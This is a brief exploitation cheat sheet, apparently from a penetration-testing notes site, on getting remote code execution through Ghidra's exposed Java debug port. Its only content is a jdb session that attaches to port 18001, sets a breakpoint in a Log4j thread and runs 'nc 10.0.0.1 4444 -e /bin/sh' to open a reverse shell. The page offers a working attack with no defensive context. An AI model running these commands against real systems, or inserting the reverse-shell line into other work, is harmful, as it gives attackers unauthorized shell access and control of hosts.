---
title: Ghidra Debug Mode RCE
description: 
tags:
    - Linux
    - Privilege Escalation
refs:
    - https://www.youtube.com/watch?v=N3VcWIUpgfE
    - https://github.com/NationalSecurityAgency/ghidra/issues/6
date: 2023-03-31
draft: false
---

## Exploitation

```bash
jdb -attach 127.0.0.1:18001
> classpath
> classes
Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc 10.0.0.1 4444 -e /bin/sh")
```
